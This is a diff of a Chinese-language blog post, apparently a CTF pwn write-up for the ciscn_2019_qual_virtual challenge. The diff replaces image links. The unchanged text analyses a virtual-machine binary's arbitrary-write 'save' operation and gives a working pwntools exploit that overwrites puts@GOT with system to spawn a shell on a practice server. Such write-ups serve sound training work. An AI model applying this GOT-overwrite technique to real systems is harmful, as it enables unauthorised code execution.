@@ -159,9 +159,9 @@
 <h2 id="1-ciscn-2019-qual-virtual"><a href="#1-ciscn-2019-qual-virtual" class="headerlink" title="1.ciscn_2019_qual_virtual"></a>1.ciscn_2019_qual_virtual</h2><p>先checksec一下</p>
 <p><img src="https://p.sda1.dev/22/77a594fb249e9002e43fc311475c9c72/1AXLFT.png"></p>
 <p>浅看一下主程序</p>
-<p>![](<a href="https://p.sda1.dev/22/ae50cffdccf870377680c841110d6902/5AXLFT">https://p.sda1.dev/22/ae50cffdccf870377680c841110d6902/5AXLFT</a> _2_.png)</p>
-<p>![](<a href="https://p.sda1.dev/22/1b947708385c097691bbc0ea440a403c/5AXLFT">https://p.sda1.dev/22/1b947708385c097691bbc0ea440a403c/5AXLFT</a> _3_.png)</p>
-<p>![](<a href="https://p.sda1.dev/22/e4446ed3c9e8a75d6010d76f96cc9189/5AXLFT">https://p.sda1.dev/22/e4446ed3c9e8a75d6010d76f96cc9189/5AXLFT</a> _4_.png)</p>
+<p><img src="https://p.sda1.dev/22/b78aa7d52e70a236f4fa5c5e74a7bf1b/11.png"></p>
+<p><img src="https://p.sda1.dev/22/0ef0ffbb3683e922db7bf398512b6106/14.png"></p>
+<p><img src="https://p.sda1.dev/22/de062ec3be7f6e4b16f37941fb80421d/12.png"></p>
 <p>接下来就一个个分析</p>
 <ul>
 <li><p>get</p>
@@ -203,7 +203,7 @@
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">save</span><span class="params">(<span class="type">void</span> **data_addr)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !get(data_addr, &amp;v2) || !get(data_addr, &amp;v3) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  *(*data_addr + *(data_addr + <span class="number">3</span>) + v2) = v3;</span><br><span class="line">  <span class="comment">//*(data+idx+v2)=v3</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>现在需要做的就是改puts_got为system，因为有save这个任意地址写，所以我们可以先将data这个段给劫持到0x4040d0这里。方便后续的通过data段来改puts</p>
-<p>![](<a href="https://p.sda1.dev/22/f7276d9e48123bb7654601c8b9ad357e/5AXLFT">https://p.sda1.dev/22/f7276d9e48123bb7654601c8b9ad357e/5AXLFT</a> _1_.png)</p>
+<p><img src="https://p.sda1.dev/22/092ab0ea9328b5bd51271a3b19520dc0/13.png"></p>
 <p>当data到了0x4040d0这里之后，需要将puts的地址给读入到data里，算一下puts_got和劫持完成之后data的偏移为0xb0也就是-21的偏移，利用load读的漏洞将puts_got这里的地址读到0x4040d0。puts_got和system的偏移算出来之后利用add将data里的puts_addr + -0x2a300就可以将data里的puts_addr改成system，最后将data里的system利用save放到puts_got里还是-25的偏移。</p>
 <p>EXP</p>
 <figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn import *</span><br><span class="line"></span><br><span class="line">context(<span class="attribute">arch</span>=<span class="string">&#x27;amd64&#x27;</span>, <span class="attribute">os</span>=<span class="string">&#x27;linux&#x27;</span>, <span class="attribute">log_level</span>=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, 28718) </span><br><span class="line"><span class="comment">#r = process(&#x27;./qv&#x27;)</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&#x27;Your program name:\n&#x27;</span>, <span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;Your instruction:\n&#x27;</span>, <span class="string">&#x27;push push save push load push add push save&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;Your stack data:\n&#x27;</span>, f<span class="string">&#x27;&#123;0x4040d0&#125; -3 -21 &#123;-0x2a300&#125; -21&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
